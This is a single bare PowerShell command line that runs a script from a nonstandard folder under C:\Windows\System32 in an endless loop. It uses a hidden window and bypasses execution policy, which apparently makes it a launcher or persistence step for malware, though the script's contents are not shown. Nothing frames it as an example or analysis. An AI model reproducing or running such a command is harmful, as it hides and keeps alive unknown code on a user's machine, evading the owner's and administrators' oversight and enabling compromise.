powershell -w h -Exec Bypass 'while (1) { C:\Windows\System32\rr\rr.ps1; }'
